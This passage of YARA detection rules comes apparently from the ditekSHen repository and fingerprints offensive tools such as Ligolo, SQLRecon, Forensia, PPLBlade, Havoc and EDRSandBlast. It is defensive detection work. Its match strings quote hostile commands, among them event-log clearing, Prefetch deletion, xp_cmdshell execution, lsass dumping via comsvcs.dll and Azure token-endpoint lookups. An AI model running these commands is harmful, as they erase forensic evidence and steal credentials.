		uint16( 0 ) == 0x5a4d and ( all of ( $x* ) or ( 1 of ( $x* ) and 3 of ( $s* ) ) or ( 5 of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_PROX_Revsocks : FILE
{
	meta:
		description = "Detects revsocks Reverse socks5 tunneler with SSL/TLS and proxy support"
		author = "ditekSHen"
		id = "f85bc557-40ab-5533-8a89-a2de9bbc9ad9"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1307-L1321"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "4a8e68f25b7ba10b0eb9772ed4ba2b9c6566768f2b5a2859df8bac644d196bf3"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "main.agentpassword" fullword ascii
		$s2 = "main.connectForSocks" fullword ascii
		$s3 = "main.connectviaproxy" fullword ascii
		$s4 = "main.DnsConnectSocks" fullword ascii
		$s5 = "main.listenForAgents" fullword ascii
		$s6 = "main.listenForClients" fullword ascii
		$s7 = "main.getPEMs" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x457f ) and 4 of them
}
rule DITEKSHEN_INDICATOR_TOOL_PWS_Azbelt : FILE
{
	meta:
		description = "Detects azbelt for enumerating Azure related credentials primarily on AAD joined machines"
		author = "ditekSHen"
		id = "cf9268d2-1928-51e8-9643-ee0a5bada9fa"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1323-L1338"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "71cc2b3418ea5e285adafe03fa80bade67dc3e4073fe58d42bc6190860b48b43"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "@http://169.254.169.254/metadata/identity/oauth2/token?api-version=" ascii
		$s2 = "@Partner Customer Delegated Admin Offline Processor" fullword ascii
		$s3 = "@TargetName: " fullword ascii
		$s4 = "httpclient.nim" fullword ascii
		$s5 = "@DSREG_DEVICE_JOIN" fullword ascii
		$s6 = "@.azure/msal_token_cache.bin" fullword ascii
		$s7 = "CredEnumerateW" fullword ascii
		$s8 = "@http://169.254.169.254/metadata/instance?api-version=" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 6 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Dontsleep : FILE
{
	meta:
		description = "Detects Keep Host Unlocked (Don't Sleep)"
		author = "ditekShen"
		id = "f71bd0d5-a526-5f1e-8bd3-9e653db610a7"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1340-L1354"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b8e2132d3b36c3e2d2662a586916c7e4fc029f81af08b5c18006833c4e6f772f"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = ":Repeat###DEL \"%s\"###if exist \"%s\" goto Repeat###DEL \"%s\"###" wide
		$s2 = "powrprof.dll,SetSuspendState" wide
		$s3 = "_selfdestruct.bat" wide
		$s4 = "please_sleep_block_" ascii
		$s5 = "Browser-Type: MiniBowserOK" wide
		$s6 = "m_use_all_rule_no_sleep" ascii
		$s7 = "BlockbyExecutionState: %d on:%d by_enable:%d" fullword wide

	condition:
		uint16( 0 ) == 0x5a4d and 4 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Nsudo : FILE
{
	meta:
		description = "Detects NSudo allowing to run processes as TrustedInstaller or System"
		author = "ditekShen"
		id = "9a21b923-b02e-553b-8f53-026d7034c319"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1356-L1369"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "6bcffa79ca06b0b4178d6ea256f98d917c2b19cec0b059889b8d015d226a53f9"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "cmd /c start \"NSudo." wide
		$x2 = "*\\shell\\NSudo" fullword wide
		$x3 = "Projects\\NSudo\\Output\\Release\\x64\\NSudo.pdb" ascii
		$s1 = "-ShowWindowMode=Hide" wide
		$s2 = "?what@exception@@UEBAPEBDXZ" fullword ascii
		$s3 = "NSudo.RunAs." ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 2 of ( $x* ) or ( 1 of ( $x* ) and 2 of ( $s* ) ) or all of ( $s* ) or 4 of them )
}
rule DITEKSHEN_INDICATOR_TOOL_Ligolo : FILE
{
	meta:
		description = "Detects Ligolo tool for establishing SOCKS5 or TCP tunnels from a reverse connection"
		author = "ditekSHen"
		id = "cc461fd1-9a2f-59ce-af74-a0f55b8850b1"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1371-L1385"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b515dc184013c2f67d37e42d7172e2471b3a93c94024be12c7f587296287282d"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$p1 = "/ligolo/main.go" ascii
		$p2 = "/armon/go-socks5" ascii
		$s1 = "main.StartLigolo" fullword ascii
		$s2 = "main.handleRelay" fullword ascii
		$s3 = "main.startSocksProxy" fullword ascii
		$s4 = "_main.tlsFingerprint" fullword ascii
		$s5 = "main.verifyTlsCertificate" fullword ascii

	condition:
		( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x457f or uint16( 0 ) == 0xfacf ) and ( ( all of ( $p* ) and 1 of ( $s* ) ) or all of ( $s* ) or ( 1 of ( $p* ) and 4 of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Ngrok : FILE
{
	meta:
		description = "Detects Ngrok"
		author = "ditekSHen"
		id = "fc0a0de8-b68b-5b6b-a222-bbc031ebabd3"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1405-L1418"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f4bba142652aaf77e5b7c123b743cf165ae17210c39cf65b7311f7e7bd91f7e1"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "dashboard.ngrok.com" ascii
		$s2 = "go.ngrok.com/cmd/ngrok/main.go" ascii
		$s3 = "ngrok agent" ascii
		$s4 = "*ngrok.clientInfo" ascii
		$s5 = "'%s'  socket: '%s'  port: %d/edges/https/{{ .EdgeID }}/routes/{{ .ID }}/webhook_" ascii
		$s6 = "/{{ .ID }}/tunnel_sessions/{{ .ID }}/restart" ascii

	condition:
		( uint16( 0 ) == 0x5a4d or uint16( 0 ) == 0x457f or uint16( 0 ) == 0xfacf ) and ( 3 of them )
}
rule DITEKSHEN_INDICATOR_TOOL_Sqlrecon : FILE
{
	meta:
		description = "Detects SQLRecon C# MS-SQL toolkit designed for offensive reconnaissance and post-exploitation"
		author = "ditekSHen"
		id = "ec91285b-690d-5fd3-b0fc-f8d72cbb7e15"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1420-L1436"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "784dbc518cf9492557c9b3536256c4a9b03e4536cf7cee7e764b8009dd4686bb"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "ConvertDLLToSQLBytes" ascii
		$s2 = "\\SQLRecon.pdb" ascii
		$s3 = "GetAllSQLServerInfo" ascii
		$s4 = "<GetMSSQLSPNs>b__" ascii
		$s5 = "select 1; exec master..xp_cmdshell" wide
		$s6 = "-> Command Execution" wide
		$s7 = ";EXEC dbo.sp_add_jobstep @job_name =" wide
		$s8 = "EXEC sp_drop_trusted_assembly 0x" wide
		$s9 = "(&(sAMAccountType=805306368)(servicePrincipalName=MSSQL*))" wide

	condition:
		uint16( 0 ) == 0x5a4d and 5 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Ngrokgo : FILE
{
	meta:
		description = "Detects Go implementation variant for Ngrok"
		author = "ditekSHen"
		id = "b11f67c5-846d-57b2-8edc-521b2dc77503"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1473-L1488"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "4ec151661e3af922aba202c68392a2af17e2c4ed25a71a0b5aacc13fbfcc5c53"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "/codegangsta/inject" fullword wide
		$s2 = "go.ngrok.com/" ascii
		$s3 = "GetIsNgrokDomain" ascii
		$s4 = "GetNgrokMetering" ascii
		$s5 = "*cli.ngrokService" ascii
		$s6 = "GetAllowNgrokLink" ascii
		$s7 = "ngrok {{.Name}}{{if .Flags}}" ascii
		$s8 = "github.com/nikolay-ngrok/" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 4 of them
}
rule DITEKSHEN_INDICATOR_Tool_Forensia : FILE
{
	meta:
		description = "Detects Forensia anti-forensics tool used for erasing footprints"
		author = "ditekSHen"
		id = "bcd05c2e-7ddd-5ce7-a6a7-0659bed38744"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1490-L1523"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "7147eee62df10cd8a6c00ec80c4d1bdb8234a181dd6af81d0580d847f05bd0b6"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$c1 = "for /F \"tokens=*\" %1 in ('wevtutil.exe el') DO wevtutil.exe cl \"%1\"" ascii
		$c2 = "del /F /Q C:\\Windows\\Prefetch\\*" ascii
		$c3 = "del C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf" ascii
		$c4 = "del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\*" ascii
		$c5 = "del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\CustomDestinations\\*" ascii
		$c6 = "del /F /Q %APPDATA%\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*" ascii
		$c7 = "fsutil.exe usn deletejournal /D C:" ascii
		$r1 = "\\Memory Management\\PrefetchParameters" wide
		$r2 = "\\Explorer\\Advanced" wide
		$r3 = "\\Services\\EventLog" wide
		$r4 = "\\Shell\\BagMRU" wide
		$r5 = "\\Control\\FileSystem" wide
		$r6 = "\\Setup\\VC" wide
		$s1 = "[LOG] - %s" wide
		$s2 = "\\forensia\\regedit.hpp" wide
		$s3 = "NtfsDisableLastAccessUpdate" wide
		$s4 = "Melting The Executable" wide
		$s5 = "Sysmon Unloader" wide
		$s6 = "Rundll32.exe apphelp.dll,ShimFlushCache" ascii
		$s7 = "\\Debug\\forensia.pdb" ascii
		$s8 = { 55 00 00 00 aa 00 00 00 92 49 24 00 49 24 92 00
                24 92 49 00 00 00 00 00 11 00 00 00 22 00 00 00
                33 00 00 00 44 00 00 00 66 00 00 00 88 00 00 00
                99 00 00 00 bb 00 00 00 cc 00 00 00 dd 00 00 00
                ee 00 00 00 ff 00 00 00 6d b6 db 00 b6 db 6d 00
                db 6d b6 }

	condition:
		uint16( 0 ) == 0x5a4d and ( ( 4 of ( $c* ) and 2 of ( $r* ) ) or ( 4 of ( $r* ) and 2 of ( $c* ) ) or 6 of ( $s* ) or ( 3 of ( $s* ) and 2 of ( $r* ) and 1 of ( $c* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Dogzproxy : FILE
{
	meta:
		description = "Detects Dogz proxy tool"
		author = "ditekSHen"
		id = "de2a8d26-0e8e-5999-baca-1e43933af866"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1525-L1537"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "575cfed9cb7979216fd8fd2a05efe5dfece3a9120b4f185c015918337829ed63"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "LOGONSERVER=" fullword wide
		$s2 = "DOGZ_E_" ascii
		$s3 = "got handshake_id=%d" ascii
		$s4 = "responser send connect ack" ascii
		$s5 = "dogz " ascii

	condition:
		uint16( 0 ) == 0x5a4d and 4 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Fastreverseproxy : FILE
{
	meta:
		description = "Detects Fast Reverse Proxy (FRP) tool"
		author = "ditekSHen"
		id = "d643cc38-a96c-5353-bb46-ca46ea740e3b"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1539-L1555"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c26d9e8833c7055a03a446eb983c7f70f1f18669d009ebc204dda3f0bb6048f7"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "<title>frp client admin UI</title>" ascii
		$x2 = "https://github.com/fatedier/frp" ascii
		$s1 = ").SetLogin" ascii
		$s2 = ").SetPing" ascii
		$s3 = ").SetNewWorkConn" ascii
		$s4 = ").ServeHTTP" ascii
		$s5 = ").Middleware" ascii
		$s6 = "frpc proxy config error:" ascii
		$s7 = "frpc sudp visitor proxy is close" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( all of ( $x* ) or ( 1 of ( $x* ) and 4 of ( $s* ) ) or ( all of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Gogoscan : FILE
{
	meta:
		description = "Detects GoGo scan tool"
		author = "ditekSHen"
		id = "c24ede04-2971-55f8-8b60-ec3bdca844d7"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1557-L1571"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c9fbc98a28c74bf920f5f7d62713834d18b33b5c65483a1bd42e4555764c8346"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "(conn) (scan  (scan) MB in  Value>" ascii
		$s2 = "sweep sysmontargettelnet" ascii
		$s3 = "%d bytes(?i) (.*SESS.*?ID)([a-z0-9])([A-Z]+)" ascii
		$s4 = "prepareForSweep" ascii
		$s5 = "Scanned %s with %d ports, found %d" ascii
		$s6 = "/chainreactors/gogo/" ascii
		$s7 = "Starting task %s ,total ports: %d , mod: %s" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 6 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Gogoprocdump : FILE
{
	meta:
		description = "Detects GoGo (lsass) process dump tool"
		author = "ditekSHen"
		id = "f92845c6-f8ae-50d0-97ea-cfa72051c2de"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1573-L1586"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "f410882e4c6c8b65e7d3c192cf94bf99d61cf54dc21d80cdf17193b34752c576"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "C:\\temp" ascii
		$s2 = "gogo" fullword ascii
		$s3 = "/DumpLsass-master/SilentProcessExit/" ascii
		$s4 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zone" ascii
		$s5 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe" ascii
		$s6 = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 4 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Fscan : FILE
{
	meta:
		description = "Detects GoGo scan tool"
		author = "ditekSHen"
		id = "3bf73853-15c1-54f7-866a-6a7632e39f19"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1588-L1602"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "b107eb767454c4c084a7237c107c8414bdb03c324902769ac544c5903e346e17"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "fscan version:" ascii
		$s2 = "Citrix-ConfProxyCitrix-MetaframeCitrix-NetScalerCitrix-XenServerCitrix_Netscaler" ascii
		$s3 = "(AkamaiGHost)(DESCRIPTION=(Typecho</a>)(^.+)([0-9]+)(confluence.)(dotDefender)" ascii
		$s4 = "/fscan/" ascii
		$s5 = "WebScan.CheckDatas" ascii
		$s6 = "'Exploit.Test" ascii
		$s7 = "rules:" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 4 of them
}
rule DITEKSHEN_INDICATOR_TOOL_BURTNCIGAR : FILE
{
	meta:
		description = "Detects BURNTCIGAR a utility which terminates processes associated with endpoint security software"
		author = "ditekSHen"
		id = "b5260d7e-07ac-5633-b450-e2124cbba65b"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1604-L1616"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "4977332a0b20b300a5fc34f0f8d56221f55b66783853306d803e91701cb7e6ec"
		score = 75
		quality = 75
		tags = "FILE"
		clamav1 = "INDICATOR.Win.TOOL.BURNTCIGAR"

	strings:
		$s1 = "Kill PID =" ascii
		$s2 = "CreateFile Error =" ascii
		$s3 = "\\KillAV" ascii
		$s4 = "DeviceIoControl" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 3 of them
}
rule DITEKSHEN_INDICATOR_TOOL_Pplblade : FILE
{
	meta:
		description = "Detects PPLBlade Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk"
		author = "ditekSHen"
		id = "60c9b036-51a0-5e08-83de-1f69f62245c3"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1634-L1658"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "da21402b07fcd0358ba630e48ab35956cb7ed8c12836a339c85b2ee5e414543e"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "PPLBlade" ascii
		$x2 = "/PPLBlade/" ascii
		$x3 = "PPLBlade.exe --mode" ascii
		$x4 = "PPLBLADE.SYSPPLBlade.dmp" ascii
		$s1 = "Dump bytes sent at %s:%d. Protocol: %s" ascii
		$s2 = "Deobfuscated dump saved in file %s" ascii
		$m1 = "main.WriteDriverOnDisk" ascii
		$m2 = "main.ProcExpOpenProc" ascii
		$m3 = "main.miniDumpCallback" ascii
		$m4 = "main.copyDumpBytes" ascii
		$m5 = "main.MiniDumpGetBytes" ascii
		$m6 = "main.SendBytesRaw" ascii
		$m7 = "main.SendBytesSMB" ascii
		$m8 = "main.DeobfuscateDump" ascii
		$m9 = "main.dumpMutex" ascii
		$m10 = "main.dbghelpDLL" ascii
		$m11 = "main.miniDumpWriteDump" ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( 3 of ( $x* ) or ( 1 of ( $x* ) and ( 1 of ( $s* ) or 3 of ( $m* ) ) ) or ( all of ( $s* ) and 3 of ( $m* ) ) or ( 7 of ( $m* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Sharpldap : FILE
{
	meta:
		description = "Detects SharpLDAP tool written in C# that aims to do enumeration via LDAP queries"
		author = "ditekSHen"
		id = "597e578d-41f0-595e-b92c-0c3676d8b47a"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1660-L1675"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "da5db3f2907229dc68e3c6f3351361a4b1fb9fe8afc597c9dfe611f9725c6181"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "SharpLDAP" ascii wide
		$x2 = "SharpLDAP.pdb" ascii
		$s1 = "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" wide
		$s2 = "(&(servicePrincipalName=*))" wide
		$s3 = "/Enumerating (Domain|Enterprise|Organizational|Service|Members|Users|Computers)/" wide
		$s4 = "ListMembers" fullword ascii
		$s5 = "GroupMembers" fullword ascii
		$s6 = "get_SamAccountName" fullword ascii

	condition:
		uint16( 0 ) == 0x5a4d and ( ( 1 of ( $x* ) and 4 of ( $s* ) ) or ( 5 of ( $s* ) ) )
}
rule DITEKSHEN_INDICATOR_TOOL_Pandora : FILE
{
	meta:
		description = "Detects Pandora tool to extract credentials from password managers"
		author = "ditekSHen"
		id = "3f71f24b-755f-5967-afbf-04a512bd0a19"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1677-L1691"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "dd5be3b99b62ec40c242225d9420b9ce299c4f348882b0380289309dfedbc1e8"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "process PID:" fullword wide
		$s2 = "Dump file created:" fullword wide
		$s3 = "System.Security.AccessControl.FileSystemAccessRule('Everyone', 'FullControl', 'Allow')" ascii
		$s4 = "{[math]::Round($_.PrivateMemorySize64" ascii
		$s5 = "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump $" ascii
		$s6 = "\"payload\":{\"logins\":" ascii
		$s7 = "\\pandora.pdb" ascii

	condition:
		uint16( 0 ) == 0x5a4d and 5 of them
}

rule DITEKSHEN_INDICATOR_TOOL_Havoc : FILE
{
	meta:
		description = "Detects Havoc Demon"
		author = "ditekSHen"
		id = "71ad145c-4017-597a-837e-5d11ba64d7c0"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1693-L1710"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "c5806deaa57590ebe1923608b9b085460e0edd024721e6e9d7073765a79bf22b"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$x1 = "X-Havoc:" wide
		$x2 = "X-Havoc-Agent:" wide
		$s1 = "\\Werfault.exe" wide
		$s2 = "/funny_cat.gif" wide

	condition:
		uint16( 0 ) == 0x5a4d and ( all of ( $x* ) or 3 of them or ( pe.number_of_imports == 0 and pe.number_of_exports == 0 and 2 of them ) )
}
rule DITEKSHEN_INDICATOR_TOOLS_Localpotato : FILE
{
	meta:
		description = "Detects LocalPotato"
		author = "ditekShen"
		id = "65f8305b-b830-58e7-970b-da1df9a06e9b"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1712-L1743"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "88fba16a6eec6d2c23331642041c6adfddddeb21ba8e74b6959bd48c90f73cbb"
		score = 75
		quality = 73
		tags = "FILE"

	strings:
		$x1 = "LocalPotato.stg" fullword wide
		$x2 = "we always love potatoes" fullword ascii
		$s1 = "{00000306-0000-0000-c000-000000000046}" wide
		$s2 = "{854A20FB-2D44-457D-992F-EF13785D2B51}" wide
		$s3 = "cifs/127.0.0.1" wide
		$s4 = "\\\\127.0.0.1\\c$" wide
		$s5 = "complete failed: 0x%08x" ascii
		$s6 = "Authorization: NTLM %s" ascii
		$s7 = "Objref Moniker Display Name = %S" ascii
		$s8 = "SMB Connect Tree: %S" ascii
		$s9 = "b64type=%s" fullword ascii
		$s10 = "decodes=%s" fullword ascii
		$s11 = { 53 4d 42 72 00 00 00 00 18 01 48 00 00 00 00 00
               00 00 00 00 00 00 00 ff ff ac 7b 00 00 00 00 00
               22 00 02 4e 54 20 4c 4d 20 30 2e 31 32 00 02 53
               4d 42 20 32 2e 30 30 32 00 02 53 4d 42 20 32 2e
               3f 3f 3f 00 00 00 00 00 00 00 00 00 00 00 68 fe
               53 4d 42 40 }
		$o1 = { 44 8b 4c 24 34 48 8d 44 24 38 48 89 44 24 28 4c }
		$o2 = { e8 c4 ff ff ff 33 d2 48 8d 4d f0 41 b8 d0 04 00 }
		$o3 = { 83 7b 0c 00 75 42 8b 03 25 ff ff ff 1f 3d 21 05 }
		$o4 = { 3c 68 74 6c 3c 6a 74 5c 3c 6c 74 34 3c 74 74 24 }
		$o5 = { e9 39 ff ff ff cc 48 89 5c 24 08 4c 89 4c 24 20 }
		$o6 = { 48 b9 ff ff ff ff ff ff 0f 00 48 8b c2 41 b8 0c }

	condition:
		uint16( 0 ) == 0x5a4d and ( all of ( $x* ) or ( 1 of ( $x* ) and 5 of ( $s* ) ) or 8 of ( $s* ) or ( 4 of ( $o* ) and ( 1 of ( $x* ) or 5 of ( $s* ) ) ) )
}
rule DITEKSHEN_INDICATOR_TOOLS_Edrsandblast : FILE
{
	meta:
		description = "Detects EDRSandBlast"
		author = "ditekShen"
		id = "85d6d82b-a30e-5c79-93e7-8a3bbbf4a403"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1745-L1767"
		license_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/LICENSE.txt"
		logic_hash = "9b801f053e42fbd646cf62fecf6cbf5f2cceeec82bed93ecd8625984eccb08c6"
		score = 75
		quality = 75
		tags = "FILE"

	strings:
		$s1 = "credguard" fullword wide
		$s2 = "\\cmd.exe" fullword wide
		$s3 = "ci_%s.dll" fullword wide
		$s4 = "cmd /c sc" wide
		$s5 = "fltmgr_%s.sys" fullword wide
		$s6 = "ntoskrnl_%s.exe" fullword wide
		$s7 = "ProductDir" fullword wide
		$s8 = "lsass.exe" fullword wide
		$s9 = "0x%p;%ws;%ws;;;" ascii
		$s10 = "MiniDumpWriteDump" ascii
		$s11 = "EDRSB_Init: %u" ascii
		$s12 = "ntoskrnloffsets.csv" fullword wide nocase
		$s13 = "wdigestoffsets.csv" fullword wide nocase
		$o1 = { eb 0e 8b 85 34 15 00 00 ff c0 89 85 34 15 00 00 }
		$o2 = { 74 48 8b 85 34 15 00 00 41 b9 04 01 00 00 4c 8d }

	condition:
		uint16( 0 ) == 0x5a4d and 7 of them
}
rule DITEKSHEN_INDICATOR_TOOLS_Rsockstun : FILE
{
	meta:
		description = "Detects rsockstun"
		author = "ditekShen"
		id = "a284a607-abea-5914-ad3a-84eaff733ee0"
		date = "2020-11-06"
		modified = "2024-09-25"
		reference = "https://github.com/ditekshen/detection"
		source_url = "https://github.com/ditekshen/detection/blob/e76c93dcdedff04076380ffc60ea54e45b313635/yara/indicator_tools.yar#L1769-L1781"
